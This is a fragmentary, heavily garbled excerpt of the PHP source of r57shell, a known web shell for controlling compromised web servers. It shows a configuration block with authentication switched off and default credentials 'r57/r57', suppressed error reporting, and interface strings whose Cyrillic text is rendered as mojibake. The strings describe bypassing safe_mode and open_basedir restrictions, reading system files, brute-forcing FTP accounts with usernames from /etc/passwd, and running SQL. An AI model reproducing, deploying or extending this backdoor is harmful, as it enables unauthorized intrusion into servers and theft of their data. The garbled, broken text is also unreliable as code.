...
/*
/*
/*  r57shell.php - 뱨ಠද ௧㯫驠㡬 㼯שּׂ 欫 믬ᮤ  汢汥 汥硡ᴧ氍
/*  û �泥 롷᳼  㦰龠欠᪲庠http://rst.void.ru
/*  å鿺 1.24 (New Year Edition)
/*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/
/*  (c)oded by 1dt.w0lf
/*  RST/GHC http://rst.void.ru , http://ghc.ru
/*  ANY MODIFIED REPUBLISHING IS RESTRICTED
/*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/
/*  ϲ妫 ⬠䯤ᱭﲲ 蠠௬ﺼ 表妨: blf, virus, NorD 衢欠汲졨硒ST/GHC. 
/******************************************************************************************************/
/* ~~~ Π着衼 Options  ~~~ */

// û⯰ 輪ࡼ Language
// $language='ru' - 멩 (russian)
// $language='eng' - english (ᮣ쩩멩)
$language='ru';

// s殲鵨롶鿠| Authentification
// $auth = 1; - s殲鵨롶鿠㫫殠  ( authentification = On  )
// $auth = 0; - s殲鵨롶鿠㼪쿷殠 ( authentification = Off )
$auth = 0; 

// ̮䩭 衯ᱮ켠嬿 寱ࠠꡱ뱨ೳ (Login & Password for access)
// ΅ ȀŜӅ ҌƍɒܠЅхĠрȌƙƍɅ̠΀ ҅тƐš!! (CHANGE THIS!!!)
$name='r57'; // 쯣魠௫询᳥쿠 (user login)
$pass='r57'; // ࡰלּ ௫询᳥쿠(user password)
/******************************************************************************************************/
error_reporting(0);
...
'ru_text26'=>'ɱ௫询᳼',
'ru_butt5' =>'Ƞറ鳼',
'ru_text28'=>'Ѡ⯲ࡢ safe_mode',
'ru_text29'=>'Ůᰰ溥�
'ru_butt6' =>'Ҭ殨',
'ru_text30'=>'аﲬﳰ ᪫৬
'ru_butt7' =>'û㦱觬
'ru_text31'=>'ՠꫠ妭',
'ru_text32'=>'û௫饠PHP 믤৬
'ru_text33'=>'а렠㯧�衮ⶮ堠擄ᮨ殨顯pen_basedir 汥硴騠cURL',
'ru_butt8' =>'а鳼',
'ru_text34'=>'а렠㯧�衮ⶮ堠擄ᮨ殨顳afe_mode 汥硴龠include',
'ru_text35'=>'а렠㯧�衮ⶮ堠擄ᮨ殨顳afe_mode 汥硧ᤰ諳 ᪫ࡢ mysql',
'ru_text36'=>' 蠧,
'ru_text37'=>'̮䩭',
'ru_text38'=>'Рלּ',
'ru_text39'=>'Ӡ⬨৬
...
'ru_butt10'=>'Үᮨ',
'ru_butt11'=>'ѥ塪鱮㡲',
'ru_text44'=>'ѥ塪鱮㡭饠᪫࡭森譮箮! Ůלּ뮠嬿 殨!',
'ru_text45'=>'ՠꫠﶰᮥ�
'ru_text46'=>'аﲬﳰ phpinfo()',
'ru_text47'=>'аﲬﳰ 寧 php.ini',
'ru_text48'=>'Ԥᬥ 㱥� ᪫,
'ru_text49'=>'Ԥᬥ 뱨ೠ  汢池',
'ru_text50'=>'ɭﱬᷨ ﷥ﱥ',
'ru_text51'=>'ɭﱬᷨ ᭿觬
...
'ru_text69'=>'Р᭥1',
'ru_text70'=>'Р᭥2',
'ru_text71'=>"òﱮ顯ᱠ� 믬ᮤ:\r\n- 嬿 CHOWN - 魿 冷 ௫询᳥쿠鬨 椮 UID (鲫﬩ \r\n- 嬿 믬ᮤ CHGRP - 魿 䱳఻ 鬨 GID (鲫﬩ \r\n- 嬿 믬ᮤ CHMOD - 欮塷鲫 㯱�鸭ﬠ౥岲ᣫ殨蠨魥 0777)",
'ru_text72'=>'ӥ벲 嬿 ௨렧,
'ru_text73'=>'ɱ롲 ⡯ᰪ姬
'ru_text74'=>'ɱ롲 ⡴᪫ᵧ,
'ru_text75'=>'* �鲯לּ询᳼ 椳퀰 㼰᧥',
'ru_text76'=>'Ю鲪 櫱ࡢ ᪫ᵠ ௬ﺼ 鬨 find',
'ru_text77'=>'аﲬﳰ 볳 ⡧ 塭',
'ru_text78'=>'Ю롧㡲 ᢫鷻',
'ru_text79'=>'Ю롧㡲 ﬡ',
'ru_text80'=>'Ө溺
'ru_text81'=>'ҥ',
'ru_text82'=>' 軠塭',
'ru_text83'=>'û௫饠SQL 衯ﲠ',
'ru_text84'=>'SQL 衯ﱧ,
'ru_text85'=>'а렠㯧�衮ⶮ堠擄ᮨ殨顳afe_mode 汥硢௫饠믬ᮤ ⡍SSQL 汢汥',
'ru_text86'=>'ҪḨ㡭饠᪫ࡱ 汢池',
'ru_butt14'=>'ҪḠ',
'ru_text87'=>'Ƞ䱳諠 ᪫ 填殭冷 ftp-汢池',
'ru_text88'=>'FTP-汢氺௰',
'ru_text89'=>'ՠꫠftp 汢汥',
'ru_text90'=>'ѥ穬 র楠觬
'ru_text91'=>'p飨 ⧬
...
'ru_text94'=>'FTP-ⱳﱱ',
'ru_text95'=>'ү鲮ꡯלּ询᳥즩',
'ru_text96'=>'Υ 填ﲼ ௫鳼 ੱ猪௫询᳥즩',
'ru_text97'=>'а殮 믬⩭ᷨ麠',
'ru_text98'=>'Ԥḭ ௤묾殨麠',
'ru_text99'=>'* ⡪ḥ㥠쯣鮠 衯ᱮ쿠鲯לּ败 魿 ௫询᳥쿠駠/etc/passwd',
'ru_text100'=>'ϲౠ㫠 ᪫填殭顴汢氧,
'ru_text101'=>'ɱ௫询᳼ ᫦塯汥㦰怒(user -> resu) 魿 ௫询᳥쿠⡪ḥ㥠ࡰ﬿',
'ru_text102'=>'Ю৬
'ru_text103'=>'ϲౠ㫠 ੱ�,
'ru_text104'=>'ϲౠ㫠 ᪫࡭࡯︲顿骧,
'ru_text105'=>'ˮ�,
...
/*
k顱 믬ᮤ
Ю裮퀾 騡槠 �䯪᳭冷 ﱠ 省鵠衲浭祠믬ᮤ. ( Ҥ欠⬠䯤᱿ �顯鱮宮顫殨 )
û �泥 ᭨ 寡ᣫ 鬨 騬殿 믬ᮤ.
*/
$aliases=array(
...
$table_end1 = "</td></tr>";
$arrow = " <font face=Wingdings color=gray>輯font>";
...
function we($i)
{
if($GLOBALS['language']=="ru"){ $text = 'ϸ颪ࡠΥ � 衯鲠 ⡴᪫ '; }
...
function re($i)
{
if($GLOBALS['language']=="ru"){ $text = 'ϸ颪ࡠΥ � ౮鳠 ᪫ '; }
...
function ce($i)
{
if($GLOBALS['language']=="ru"){ $text = "Υ 填ﲼ 﨤᳼ "; }
...
function fe($l,$n)
{
$text['ru']  = array('Υ 填ﲼ ௤묾鳼 ꡦtp 汢汳','ϸ颪ࡠ㳮騠騠ftp 汢汥','Υ 填ﲼ ௬殿 婰櫲ﱨ ftp 汢汥');
